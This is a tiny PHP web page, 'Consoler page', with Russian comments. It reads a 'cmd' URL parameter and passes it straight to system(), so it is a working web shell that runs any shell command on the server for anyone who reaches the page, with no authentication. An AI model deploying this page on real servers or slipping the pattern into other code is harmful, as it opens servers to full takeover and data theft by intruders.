<html lang="en">
<head>
    <title>Consoler page</title>
    <link rel="stylesheet" href="style.css" type="text/css"/>
</head>
<body>
<?php
//Команда передается в качестве параметра или задается через форму
if(isset($_GET['cmd'])){
    //Обращаемся к system с Linux, которая выполняет введенные команды
    $command = $_GET['cmd'];
    echo 'Command: ' . $command . '<br>';
    system($command);
}
?>
</body>
</html>